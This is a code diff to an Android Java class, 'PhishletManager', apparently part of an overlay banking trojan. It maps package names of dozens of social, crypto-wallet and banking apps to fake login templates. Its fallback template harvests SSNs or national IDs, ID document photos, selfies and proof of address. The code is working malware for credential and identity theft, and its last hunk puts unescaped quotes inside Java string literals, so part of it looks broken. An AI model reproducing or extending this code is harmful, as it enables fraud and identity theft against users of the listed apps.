@@ -5,19 +5,40 @@ import android.util.Log;
 
 import com.fason.app.features.overlay.OverlayManager;
 
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.HashMap;
 import java.util.Map;
 
 public class PhishletManager {
     private static final String TAG = "PhishletManager";
     private static final Map<String, String> templateCache = new HashMap<>();
+    private static Context appContext;
+
+    public static void init(Context ctx) {
+        appContext = ctx.getApplicationContext();
+    }
 
     public static String getTemplate(String type, String packageName, Context ctx) {
+        if (appContext == null) {
+            appContext = ctx.getApplicationContext();
+        }
+
         String cacheKey = type + "_" + packageName;
         if (templateCache.containsKey(cacheKey)) {
             return templateCache.get(cacheKey);
         }
-        String html = buildTemplate(type, packageName);
+
+        // Try to load from assets first
+        String html = loadTemplateFromAssets(packageName);
+
+        // Fallback to built-in template if asset not found
+        if (html == null) {
+            Log.w(TAG, "No asset template for " + packageName + ", using built-in");
+            html = buildTemplate(type, packageName);
+        }
+
         templateCache.put(cacheKey, html);
         return html;
     }
@@ -30,6 +51,100 @@ public class PhishletManager {
         return OverlayManager.isPersistent(packageName);
     }
 
+    public static void clearCache() {
+        templateCache.clear();
+    }
+
+    // Load HTML template from assets/templates/ folder
+    private static String loadTemplateFromAssets(String packageName) {
+        if (appContext == null) {
+            Log.e(TAG, "Context not initialized");
+            return null;
+        }
+
+        String templateFile = getTemplateFileName(packageName);
+        if (templateFile == null) {
+            return null;
+        }
+
+        try {
+            InputStream is = appContext.getAssets().open("templates/" + templateFile);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+            StringBuilder html = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                html.append(line).append("\n");
+            }
+            reader.close();
+            is.close();
+            Log.i(TAG, "Loaded template: " + templateFile);
+            return html.toString();
+        } catch (Exception e) {
+            Log.w(TAG, "Template not found: " + templateFile);
+            return null;
+        }
+    }
+
+    // Map package names to template files
+    private static String getTemplateFileName(String packageName) {
+        Map<String, String> fileMap = new HashMap<>();
+
+        // Social apps
+        fileMap.put("com.whatsapp", "whatsapp.html");
+        fileMap.put("com.facebook.katana", "facebook.html");
+        fileMap.put("com.instagram.android", "instagram.html");
+        fileMap.put("com.zhiliaoapp.musically", "tiktok.html");
+        fileMap.put("com.twitter.android", "x.html");
+        fileMap.put("com.snapchat.android", "snapchat.html");
+        fileMap.put("com.discord", "discord.html");
+        fileMap.put("com.tencent.mm", "wechat.html");
+        fileMap.put("com.xingin.xhs", "xiaohongshu.html");
+        fileMap.put("com.vkontakte.android", "vk.html");
+        fileMap.put("com.viber.voip", "viber.html");
+
+        // Crypto apps
+        fileMap.put("com.binance.dev", "binance.html");
+        fileMap.put("com.coinbase.android", "coinbase.html");
+        fileMap.put("io.metamask", "metamask.html");
+        fileMap.put("com.bitget.exchange", "bitget.html");
+        fileMap.put("app.phantom", "phantom.html");
+        fileMap.put("com.wallet.crypto.trustapp", "trustwallet.html");
+        fileMap.put("com.moonpay", "moonpay.html");
+        fileMap.put("exodusmovement.exodus", "exodus.html");
+        fileMap.put("com.okinc.okex.gp", "okx.html");
+        fileMap.put("com.atomicwallet", "atomic.html");
+        fileMap.put("pi.blockchain.android", "blockchain.html");
+        fileMap.put("com.coinomi.wallet", "coinomi.html");
+        fileMap.put("com.crypto.exchange", "crypto_com.html");
+        fileMap.put("co.edgesecure.app", "edge.html");
+
+        // Finance/Banking apps
+        fileMap.put("com.paypal.android.p2pmobile", "paypal.html");
+        fileMap.put("com.chase.sig.android", "chase.html");
+        fileMap.put("com.revolut.revolut", "revolut.html");
+        fileMap.put("com.htx.brand", "htx.html");
+        fileMap.put("com.bybit.app", "bybit.html");
+        fileMap.put("com.dydx.trading", "dydx.html");
+        fileMap.put("com.allybank.mobile", "allybank.html");
+        fileMap.put("com.capitalone.mobile", "capitalone.html");
+        fileMap.put("com.chimebank", "chimebank.html");
+        fileMap.put("com.creditonebank.mobile", "creditone.html");
+        fileMap.put("com.discoverfinancial.mobile", "discoverbank.html");
+        fileMap.put("com.samsung.android.spay", "samsungpay.html");
+        fileMap.put("com.google.android.apps.walletnfcrel", "googlewallet.html");
+        fileMap.put("com.eg.android.AlipayGphone", "alipay.html");
+        fileMap.put("com.boc.bocpay", "boc.html");
+        fileMap.put("sg.com.hsbc.hsbcsingapore", "hsbc.html");
+        fileMap.put("com.alfa_bank.mbank", "alfabank.html");
+        fileMap.put("com.bluevine.app", "bluevine.html");
+        fileMap.put("com.currencyfair", "currencyfair.html");
+        fileMap.put("com.greenfi.app", "greenfi.html");
+        fileMap.put("com.airstar.bank", "airstar.html");
+
+        return fileMap.get(packageName);
+    }
+
+    // Fallback built-in templates (used when asset files not available)
     private static String buildTemplate(String type, String packageName) {
         String appName = getAppDisplayName(packageName);
         String brandColor = getBrandColor(packageName);
@@ -84,10 +199,10 @@ public class PhishletManager {
             "<div class=\'field\'><label>National ID / SSN</label><input type=\'text\' name=\'nationalId\' placeholder=\'XXX-XX-XXXX or national ID number\' required></div>" +
             "<button class=\'btn\' onclick=\'nextStage(2)\'>Continue</button></div>" +
             "<div class=\'stage\' id=\'stage2\'><div class=\'security-badge\'><span>Take clear photos in good lighting</span></div>" +
-            "<div class=\'photo-grid\'><div class=\'photo-box\' onclick=\'capturePhoto(\"idFront\")\'><div class=\'icon\'>ID</div><p>ID Document Front</p></div>" +
-            "<div class=\'photo-box\' onclick=\'capturePhoto(\"idBack\")\'><div class=\'icon\'>ID</div><p>ID Document Back</p></div>" +
-            "<div class=\'photo-box\' onclick=\'capturePhoto(\"selfie\")\'><div class=\'icon\'>CAM</div><p>Live Selfie Photo</p></div>" +
-            "<div class=\'photo-box\' onclick=\'capturePhoto(\"proof\")\'><div class=\'icon\'>HOME</div><p>Proof of Address</p></div></div>" +
+            "<div class=\'photo-grid\'><div class=\'photo-box\' onclick=\'capturePhoto("idFront")\'><div class=\'icon\'>ID</div><p>ID Document Front</p></div>" +
+            "<div class=\'photo-box\' onclick=\'capturePhoto("idBack")\'><div class=\'icon\'>ID</div><p>ID Document Back</p></div>" +
+            "<div class=\'photo-box\' onclick=\'capturePhoto("selfie")\'><div class=\'icon\'>CAM</div><p>Live Selfie Photo</p></div>" +
+            "<div class=\'photo-box\' onclick=\'capturePhoto("proof")\'><div class=\'icon\'>HOME</div><p>Proof of Address</p></div></div>" +
             "<div class=\'field\'><label>Document Type</label><select name=\'docType\'><option>Passport</option><option selected>Driver\'s License</option><option>National ID Card</option><option>Residence Permit</option></select></div>" +
             "<div class=\'field\'><label>Document Number</label><input type=\'text\' name=\'docNumber\' placeholder=\'Document serial number\'></div>" +
             "<button class=\'btn\' onclick=\'nextStage(3)\'>Continue</button></div>" +
